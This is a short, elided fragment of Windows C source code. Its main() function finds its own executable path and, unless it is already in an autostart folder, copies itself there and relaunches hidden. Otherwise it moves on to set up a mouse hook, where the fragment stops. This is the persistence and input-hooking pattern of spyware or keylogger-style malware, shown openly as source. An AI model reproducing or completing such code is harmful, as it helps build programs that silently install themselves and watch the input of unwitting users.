...
int main(){
	...
	if(!GetModuleFileNameW(NULL, module_name, sizeof(module_name) / sizeof(wchar_t)) ||
	...
	if(wcsncmp(module_name, autostart_path, (wcsrchr(module_name, L'\\') - module_name) / sizeof(wchar_t))){
		if(!CopyFileW(module_name, wcscat(autostart_path, FILENAME_SHORT), TRUE) || (int)ShellExecuteW(NULL, L"open", autostart_path, NULL, NULL, SW_HIDE) <= 32)
			return 1;
	}else{
		/* Create mouse hook */
